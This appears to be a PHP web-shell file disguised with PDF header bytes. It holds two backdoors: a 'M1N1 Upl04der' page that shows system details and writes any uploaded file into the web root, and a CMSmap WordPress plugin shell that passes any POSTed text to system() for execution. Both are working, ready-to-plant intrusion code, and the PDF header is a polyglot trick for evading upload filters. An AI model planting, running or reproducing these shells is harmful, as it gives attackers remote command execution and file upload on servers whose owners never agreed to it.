%PDF-
%PDF-
<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>  M1N1 Upl04der  </title>
</head>
<body bgcolor="black"><center>
<font color="red"><br><br>
<h1><font face="courier" color="white" style="text-shadow: 0px 0px 30px white;"> M1N1 Upl04der </h1><br><center
<?php
// from https://github.com/1337r0j4n/php-backdoors
echo '<font color=white size=4> System: <font color=red size=5>[ <font color=lime size=3>'.php_uname().'<font color=red size=5> ]</font><br>';
echo '<font color=white size=4>Directory: <font color=red size=5>[ <font color=lime size=3>'.getcwd().'<font color=red size=5> ]</font><br><br>';
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='Upload!'>
	  </form>
	  </center>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "<font color='lime'success -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
		} else {
			echo "<font color='red' fail to upload .";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
?>
</body>
</html>


<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
?>
<form action="" method=post>
Command: <input name=c type=text size=100 value="<?php if (isset($_POST["c"])){print(stripslashes($_POST["c"]));} ?>">
<input type=submit>
</form>
<pre>
<?php if (isset($_POST["c"])){system(stripslashes($_POST["c"])." 2>&1");} ?>
</pre>